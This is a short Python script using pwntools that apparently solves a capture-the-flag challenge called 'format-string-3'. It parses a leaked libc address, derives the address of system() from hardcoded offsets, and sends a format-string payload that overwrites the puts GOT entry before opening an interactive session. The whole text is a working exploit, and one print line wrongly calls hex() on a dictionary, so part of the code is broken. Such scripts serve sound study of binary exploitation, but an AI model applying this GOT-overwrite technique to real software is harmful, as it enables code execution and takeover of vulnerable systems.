from pwn import *


context.binary = './format-string-3'


p = process('./format-string-3')


output = p.recvline().decode()
output = p.recvline().decode()

offset = 38

setvbuf_addr = int(output[len(output)-13:], 16)

setvbuf_libc = 0x7a3f0
system_libc = 0x4f760
diff = setvbuf_libc - system_libc
#print(diff)

puts_addr = int('404018', 16)
system_addr = setvbuf_addr - diff
addr_val = {puts_addr: system_addr}

print("GOT address for puts() is:", hex({puts_addr: system_addr}))
print("Address for system() is:", hex(system_addr))

payload = fmtstr_payload(offset, {puts_addr: system_addr}, write_size="byte")
print("Payload length:", len(payload))

p.sendline(payload)
p.interactive()